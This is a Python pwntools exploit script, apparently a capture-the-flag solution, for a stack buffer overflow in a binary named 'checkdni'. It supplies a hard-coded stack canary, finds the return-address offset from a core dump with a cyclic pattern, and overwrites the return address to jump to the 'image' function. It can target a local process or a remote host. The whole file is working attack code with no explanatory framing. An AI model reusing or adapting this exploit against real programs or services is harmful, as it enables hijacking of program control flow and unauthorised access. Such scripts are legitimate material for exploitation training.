#!/usr/bin/env python

from pwn import *
import re

binary = "./checkdni"
REMOTE = False
host = "localhost"
port = 4444


initial_string = b"123456789"
# the canary can be calculate with the program brute.sh
canary = b"JnIc8"

# --- calculate the offset ---
if REMOTE == False:
	elf = ELF(binary)

	p = process(binary)
	p.sendline(initial_string + canary + cyclic(200, n=8))
	p.wait()

	core = p.corefile

	offset = cyclic_find(core.read(core.rsp, 8), n=8)
	info("the offset is %d", offset)

else:
	# write the offset manually if you are executing it remotely
	offset = 8
# ----------------------------

# --- exploit the program ---
exe = ELF(binary)

if REMOTE:
	r = remote(host, port)
else:
	r = exe.process()

image = exe.symbols["image"]
info("The address of 'image' is %d", image)

payload = initial_string + canary + b"A" * offset + p64(image) 
info("The payload to send is %s", payload)

r.sendline(payload)

r.recvline()
r.recvline()
r.recvline()
print(r.recvline().decode("utf-8"))
# ----------------------------
